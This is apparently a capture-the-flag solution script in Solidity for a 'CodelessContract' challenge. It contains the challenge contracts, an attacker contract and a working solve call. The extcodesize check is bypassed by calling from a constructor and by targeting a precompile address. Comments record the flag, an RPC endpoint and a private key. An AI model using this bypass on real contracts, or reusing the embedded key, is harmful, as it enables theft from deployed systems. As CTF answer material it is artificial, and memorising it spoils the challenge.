// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(0x51A9f9Bd1530B2b0C614fA1Ff5C17Cc1d1BD8f15);
    address wallet = 0xD77410df65CCA7Fe74f84a5f97B0c36f9F6dBDA7;
    CodelessContract public challenge = setup.challenge();

    function setUp() public {}

    function run() public {
        vm.startBroadcast(0xb59d7ecc710767ceda938cbea227188207161ace3f828daf6d83ad4a14b89349);

        console.log("Sampe sini");
        // Hack hack = new Hack(address(challenge));

        console.log(getSize(address(0x1)));

        challenge.hack(address(0x3));

        console.log(setup.isSolved());

        vm.stopBroadcast();
    }

    function getSize(address addr) private view returns(uint256 size) {
        assembly {
            size := extcodesize(addr)
        }
    }
}

// RAMADAN{إِنّى صَائِمٌ}
// RPC_URL	http://playground.tcp1p.team:8192/b3bdfb61-d958-48b7-8664-97d451cf6116
// PRIVKEY	b59d7ecc710767ceda938cbea227188207161ace3f828daf6d83ad4a14b89349
// SETUP_CONTRACT_ADDR	0x51A9f9Bd1530B2b0C614fA1Ff5C17Cc1d1BD8f15
// WALLET_ADDR	0xD77410df65CCA7Fe74f84a5f97B0c36f9F6dBDA7

contract Hack {
    CodelessContract public challenge;
    address public hack = address(this);

    constructor(address _chall) {
        challenge = CodelessContract(_chall); //.hack(address(this));
        (bool success,) = address(this).delegatecall(abi.encodeWithSignature("attack()"));
        require(success, "gagal");
    }

    // function kill() external {
    //     selfdestruct(payable(msg.sender));
    // }

    function attack() external {
        challenge.hack(address(this));
    }

    fallback(bytes calldata) external payable returns(bytes memory) {
        return abi.encode(uint256(0));
    }

    receive() external payable {}
 
}

contract Setup {
    CodelessContract public challenge;
    
    constructor() payable {
        challenge = new CodelessContract();
    }
    
    function isSolved() external view returns (bool) {
        return challenge.isSolved();
    }
}

contract CodelessContract {
    
    bool public isSolved;

    function hack(address _contract) external {
        
        uint codeLen;
        assembly {
            codeLen := extcodesize(_contract)
        }
        require(codeLen == 0, "Code is not empty");
        
        (bool success, bytes memory result) = _contract.call(abi.encodePacked(unicode"昔者莊周夢為胡蝶，栩栩然胡蝶也，自喻適志與。不知周也。俄然覺，則蘧蘧然周也。不知周之夢為胡蝶與，胡蝶之夢為周與。周與胡蝶，則必有分矣。此之謂物化。"));
        
        uint256 number = abi.decode(result, (uint256));
        
        require(number < 2**224, "lol");
        require(success, "Call failed");
        isSolved = true;
    }

}